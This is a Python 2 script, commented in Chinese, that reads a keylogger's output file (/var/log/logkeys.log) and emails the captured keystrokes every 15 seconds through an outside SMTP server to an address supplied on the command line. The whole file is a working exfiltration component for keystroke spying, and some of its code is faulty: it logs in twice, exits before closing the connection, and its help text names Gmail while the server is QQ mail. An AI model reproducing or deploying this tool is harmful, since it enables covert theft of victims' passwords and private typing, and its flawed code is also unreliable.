#!/usr/bin/env python
#coding=utf-8

import smtplib
from email.Message import Message
import time
import optparse
import sched

schedular = sched.scheduler(time.time, time.sleep)

def sendMail(theEmail, thePasswd):
    systemTime=time.strftime( '%Y-%m-%d-%T', time.localtime(time.time()))
    try:
        fileobj = open("/var/log/logkeys.log", "r") #键盘记录的输出文件
        content = fileobj.read()
    except:
        print "Cannot read file\n"
        exit()
    message = Message()
    message[ 'Subject' ] = 'Log keys' #邮件标题
    message[ 'From' ] = ""
    message[ 'To' ] = theEmail
    message.set_payload("当前时间" +systemTime+ "\n" +content) #邮件正文
    msg = message.as_string()

    smtp = smtplib.SMTP("smtp.exmail.qq.com", port=465, timeout=20)
    #sm.set_debuglevel(1)  #开启debug模式
    smtp.starttls()        #使用安全连接
    smtp.login(theEmail, thePasswd)
    smtp.login(theEmail, thePasswd)
    smtp.sendmail( "", theEmail, msg)
    time.sleep(5)          #避免邮件没有发送完成就调用了
    quit()
    smtp.quit()

def perform(inc, theEmail, thePasswd):
    schedular.enter(inc, 0, perform, (inc, theEmail, thePasswd))
    sendMail(theEmail, thePasswd)

def myMain(inc, theEmail, thePasswd):
    schedular.enter(0, 0, perform, (inc, theEmail, thePasswd))
    schedular.run()

if __name__ == "__main__":
    optObj = optparse.OptionParser()
    optObj.add_option( "-u", dest = "user", help = "Gmail accoutn")
    optObj.add_option( "-p", dest = "passwd", help = "Gmail Passwd")
    (options, args) = optObj.parse_args()

    emailName = options.user
    emailPasswd = options.passwd
    myMain(15, emailName, emailPasswd)  #15表示的是相隔时间，可以根据自己的需求设

